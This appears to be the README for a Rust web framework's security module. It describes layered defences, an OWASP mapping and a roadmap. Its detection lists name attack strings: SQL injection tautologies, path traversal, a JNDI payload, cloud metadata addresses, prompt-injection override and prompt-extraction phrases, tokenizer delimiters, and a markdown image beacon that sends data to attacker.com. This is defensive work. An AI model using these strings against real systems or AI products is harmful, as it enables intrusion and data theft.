# 🛡️ High-Assurance Security Architecture & Defense-in-Depth

`rullst-security` is the dedicated high-assurance security, defense-in-depth, and runtime application self-protection (RASP) layer of the **Rullst Framework**.

Unlike traditional web frameworks that delegate security entirely to third-party middlewares or external cloud WAFs (e.g., Cloudflare, AWS WAF), Rullst implements **multi-layered, zero-allocation, compile-time and runtime protection natively within the Rust binary**.

---

## 🏛️ 1. Defense-in-Depth Architecture Model

```mermaid
graph TD
    Client[Incoming HTTP / WS Request] --> Network[1. Network & Deception Layer]
    Network --> Transport[2. Transport & Header Security]
    Transport --> RASP[3. RASP Deep Request Inspector]
    RASP --> Auth[4. Identity, MFA & Access Guard]
    Auth --> App[5. Application & ORM Execution]
    App --> DLP[6. Outbound DLP & Log Redaction]
    DLP --> ClientOut[Secure Response to Client]

    Network -.-> Honey[Honeypot Traps & Sliding Rate Limiter]
    RASP -.-> WAF[SQLi, XSS, SSRF, RCE, Path Traversal Blocks]
    Auth -.-> RBAC[RbacGuard & UserContext IDOR / BOLA Prevention]
    App -.-> Vault[Rullst Vault AES-GCM & Memory Zeroize]
    DLP -.-> SIEM[Real-Time SIEM CEF & SOC Threat Radar Stream]
```

---

## 📊 2. OWASP Top 10 & API Security Mapping Matrix

Rullst Security covers **100% of the OWASP Top 10 (Web)** and **OWASP API Security Top 10** through native, zero-panic Rust abstractions:

| OWASP Vulnerability Category | Threat Vector Prevented | Rullst Security Abstraction | Latency Overhead |
| :--- | :--- | :--- | :---: |
| **A01: Broken Access Control** | IDOR, BOLA, Horizontal Privilege Escalation | `RbacGuard`, `UserContext`, `authorize_owner_or_role`, `cargo rullst audit --idor` | **0 µs (Static dispatch)** |
| **A02: Cryptographic Failures** | Memory heap dump leak, plaintext secrets | `rullst-vault`, `VaultSecret<T>` (`Zeroize` on drop), AES-256-GCM / ChaCha20-Poly1305 | **< 1 µs** |
| **A03: Injection Attacks** | SQLi, NoSQLi, RCE, JNDI/Log4j, SSTI | `RaspSecurityLayer`, `inspect_text`, `inspect_headers`, SQLx parameterization enforce | **< 5 µs** |
| **A04: Insecure Design & Bots** | Credential stuffing, scraper bots, fuzzers | Honeypots (`rullst-honey`), Dynamic Decoy Traps (`/graphql/v1`), Proof-of-Work tokens | **< 2 µs** |
| **A05: Security Misconfiguration** | Missing HSTS, permissive CSP, clickjacking | `SecureHeadersLayer` (Automatic A+ rating on `securityheaders.com`, dynamic CSP Nonces) | **< 1 µs** |
| **A06: Vulnerable Components** | Outdated crates, exposed `.env` keys | `cargo rullst audit --ai`, `osv-scanner`, `cargo-deny` supply chain integration | **Compile / CI** |
| **A07: Identification & Auth Failures** | Brute force, credential attacks, session hijack | `LoginGuard` (Progressive async tarpit 0–5s + 15m jail ban), `rullst-security::mfa` (2FA TOTP RFC 6238) | **< 10 µs** |
| **A08: Software & Data Integrity** | CDN supply chain tampering, audit tampering | Subresource Integrity (SRI) SHA-384 asset injection, `AuditChain` HMAC-SHA256 tamper-proof log | **< 2 µs** |
| **A09: Logging & Monitoring Failures** | Plaintext secret leaks in logs, unmonitored attacks | `log_redactor` (regex secret suppression in `tracing`), SIEM CEF/Syslog exporter, Studio SOC Radar | **< 3 µs** |
| **A10: SSRF & Cross-Site WebSocket Hijacking** | Internal cloud metadata access, CSWSH | RASP SSRF IP blacklisting (`169.254.169.254`), `cswsh_guard_middleware` origin validation | **< 2 µs** |
| **Data Loss Prevention (DLP)** | Accidental database secret/AWS key response leaks | `DlpResponseLayer`, `mask_response_payload` stream interceptor | **< 5 µs** |

---

## ⚡ 3. Core Protection Modules

### 3.1. RASP — Runtime Application Self-Protection (`rullst-security::rasp`)
Zero-latency request inspector intercepting malicious attack vectors before controller execution:
- **SQL Injection**: Detects UNION SELECT, stacked queries, tautologies (`OR 1=1`), and sleep-based time blind injection.
- **Path Traversal & LFI**: Intercepts `../`, `%2e%2e%2f`, `/etc/passwd`, and Windows UNC paths.
- **SSRF**: Blocks requests targeting AWS/GCP instance metadata (`169.254.169.254`, `metadata.google.internal`) and local loopback interfaces.
- **RCE & JNDI**: Neutralizes shell injection backticks, pipes, and `${jndi:ldap://}` payloads.

### 3.2. Honeypot Deception & Login Jail Tarpit (`rullst-security::honey`, `rullst-security::login_guard`)
- **Synthetic Deception Traps**: Decoy routes (`/wp-admin`, `/admin.php`, `/.env`, `/graphql/v1`) bait automated scanners into immediate memory IP bans (`DashMap`).
- **Progressive Delay Tarpit**: Automatically introduces non-blocking asynchronous delays (from 500ms up to 5000ms) for consecutive failed logins, exhausting attacker thread pools before issuing a 15-minute IP jail block.

### 3.3. Zero-Trust Vault & Memory Zeroization (`rullst-security::vault`)
- Secrets wrapped in `VaultSecret<T>` are stored in pinned heap allocations and automatically scrubbed with cryptographically secure zeroing (`zeroize::Zeroize`) upon `Drop`, preventing memory dump forensics.
- Transparent field-level database encryption using AES-256-GCM or ChaCha20-Poly1305 with individual authentication tags.

### 3.4. HTTP Response DLP & Log Redaction (`rullst-security::dlp`, `rullst-security::log_redactor`)
- Outgoing HTTP responses are inspected in real time to prevent accidental leakage of private keys (`-----BEGIN PRIVATE KEY-----`), AWS access keys (`AKIA...`), database passwords, and JWT tokens.
- Tracing log filter automatically redacts sensitive parameters before writing to `stdout` or log files.

### 3.5. Anti-Timing Attack User Enumeration Guard (`rullst-security::timing_guard`)
- Protects authentication (`/login`), user lookup, and password reset endpoints by enforcing constant-time response normalization.
- Uses asynchronous non-blocking Tokio delays combined with randomized micro-jitter (e.g. 250ms ± 20ms) and synthetic Argon2 CPU instruction cycles on non-existent users, eliminating side-channel user enumeration.

### 3.6. LLM Security Firewall & Prompt Injection Shield v2 (`rullst-security::ai_firewall`)
- Zero-latency multi-vector prompt defense engine evaluating inputs across 5 attack vectors before requests reach LLM providers:
  1. **Direct Jailbreaks & Overrides**: `Ignore previous instructions`, `DAN mode`, `Developer Mode enabled`.
  2. **System Prompt & Context Leaking**: `Print initial instructions`, `Repeat everything above starting with 'You are'`.
  3. **Tokenizer Delimiter Collisions**: `<|im_start|>`, `[INST]`, `<<SYS>>`.
  4. **Markdown Exfiltration Beacons**: Malicious image callbacks `![leak](https://attacker.com?leak=...)`.
  5. **Invisible Zero-Width Unicode Poisoning**: Strips and flags `\u{200B}`, `\u{FEFF}`, and bi-directional control characters.

---

## 🚀 4. Security Roadmap & Future Innovations

### Phase 3: Enterprise SaaS & Zero-Trust Deepening (v12.0.0 / v12.1.0)
- [x] **Anti-Timing Attack User Enumeration Guard (`rullst-security::timing_guard`)**: Constant-time padding for authentication and password-reset endpoints, eliminating timing side-channel attacks.
- [x] **LLM Security Firewall & Prompt Injection Shield v2 (`rullst-security::ai_firewall`)**: Real-time inspection for AI endpoints detecting prompt leaks, jailbreaks, indirect injections, and training data extraction.
- [x] **CycloneDX 1.5 JSON SBOM Exporter (`cargo rullst audit --sbom`)**: Automated Software Bill of Materials with SHA-256 package hashes for regulatory compliance (SOC 2, ISO 27001, FedRAMP).
- [x] **Local Network Surface Scanner (`cargo rullst audit --network`)**: High-speed port & network interface scanner (inspired by *RustScan*) auditing local listeners and preventing `0.0.0.0` leakages.
- [x] **DevSecOps Git Pre-Commit Hook (`cargo rullst hook:install`)**: One-click Git pre-commit hook installer enforcing rustfmt, strict Clippy (`-D warnings`), and static security audits.
- [x] **100% Pure-Rustls Transport Security (`tls-rustls`)**: Strict zero-OpenSSL C-bindings mandate across all network and security crates.
- [ ] **Zero-Downtime Secret Rotation & JWKS Server (`rullst-security::key_rotation`)**: Automated cryptographic key rotation with grace period validation and dynamic `/oauth/jwks.json` serving.
- [ ] **Adaptive WAF Anomaly Engine (`rullst-security::adaptive_waf`)**: Per-IP risk scoring pipeline (0–100) dynamically escalating from stealth telemetry to Proof-of-Work challenges and TCP drops.
- [ ] **Passkeys / WebAuthn FIDO2 Engine (`rullst-security::webauthn`)**: Native biometrics (Touch ID, Face ID, Windows Hello) and hardware token (YubiKey) authentication.
- [ ] **SQL AST Query Firewall (`rullst-security::sql_firewall`)**: Syntax tree query validator blocking unparameterized dynamic queries.

### Phase 4: Post-Quantum Cryptography & Kernel-Level Defense (v13.0.0)
- [ ] **Post-Quantum Cryptography Bridge (`rullst-security::pqc`)**: NIST ML-KEM (Kyber) & ML-DSA (Dilithium) quantum-resistant session encryption algorithms.
- [ ] **eBPF & Kernel-Level Threat Containment (`rullst-security::containment`)**: Automated Linux kernel-level IP dropping via eBPF/XDP when volumetric threat thresholds are exceeded.
- [ ] **Sandboxed Wasm Plugin Engine (`rullst-security::wasm_sandbox`)**: Isolated WebAssembly execution sandbox for third-party multi-tenant SaaS extensions with strict memory/CPU limits.
